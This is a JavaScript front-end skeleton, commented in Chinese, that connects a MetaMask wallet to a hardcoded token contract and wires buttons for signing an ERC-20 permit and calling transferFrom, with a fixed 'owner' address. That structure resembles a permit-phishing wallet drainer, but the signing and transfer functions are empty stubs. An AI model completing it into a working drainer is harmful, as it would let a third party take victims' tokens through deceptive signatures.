// 指定合约地址和拥有者地址
const contractAddress = '0x2E9d30761DB97706C536A112B9466433032b28e3'; // 合约地址
const ownerAddress = '0xA465E2fc9F9D527AAEb07579E821D461F700e699'; // Owner 地址

let web3;
let contract;
let userAccount;

// 更新合约ABI
const contractABI = [
    {
        "inputs": [{"internalType": "address","name": "account","type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256","name": "","type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address","name": "owner","type": "address"},
            {"internalType": "address","name": "spender","type": "address"},
            {"internalType": "uint256","name": "value","type": "uint256"},
            {"internalType": "uint256","name": "deadline","type": "uint256"},
            {"internalType": "uint8","name": "v","type": "uint8"},
            {"internalType": "bytes32","name": "r","type": "bytes32"},
            {"internalType": "bytes32","name": "s","type": "bytes32"}
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address","name": "sender","type": "address"},
            {"internalType": "address","name": "recipient","type": "address"},
            {"internalType": "uint256","name": "amount","type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool","name": "","type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// 在文档加载时绑定事件
document.addEventListener("DOMContentLoaded", function() {
    console.log("Document loaded");
    document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
    document.getElementById('signPermitBtn').addEventListener('click', signPermit);
    document.getElementById('transferTokensBtn').addEventListener('click', transferTokens);
});

// 连接钱包功能
async function connectWallet() {
    console.log("Attempting to connect wallet...");
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = accounts[0];
            web3 = new Web3(window.ethereum);
            contract = new web3.eth.Contract(contractABI, contractAddress);

            // 显示连接的账户
            document.getElementById('walletAddress').innerText = `Connected: ${userAccount}`;
            document.getElementById('signPermitBtn').disabled = false; // 启用签名按钮
            console.log("Wallet connected:", userAccount);
            alert("钱包已连接!");
        } catch (error) {
            console.error("Error connecting to wallet:", error);
            alert("连接钱包时出错: " + error.message);
        }
    } else {
        alert("请安装 MetaMask!");
        console.warn("MetaMask is not installed.");
    }
}

// 签名授权（请根据需要填充此函数）
async function signPermit() {
    console.log("Signing permit...");
    // 此处添加签名逻辑
}

// 转移代币（请根据需要填充此函数）
async function transferTokens() {
    console.log("Transferring tokens...");
    // 此处添加转移代币逻辑
}
